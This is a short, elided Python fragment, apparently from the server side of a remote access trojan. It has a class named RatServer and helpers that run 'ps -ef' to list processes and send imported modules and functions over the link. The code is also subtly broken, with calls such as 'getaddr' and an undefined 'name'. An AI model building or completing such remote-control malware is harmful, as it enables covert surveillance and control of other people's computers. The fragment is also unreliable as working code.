...
def send_process(obj):
    return convert_to(subprocess.check_output("ps -ef"))
...
class RatServer:
    ...
    def send_library(library):
        module = import_module(library)
        return convert_to(getaddr(module, name))

    def send_function(func):
        
        return convert_to(func)
    ...
    def send_required_libraries(self):
        req_libraries = (os, socket, platform, subprocess)
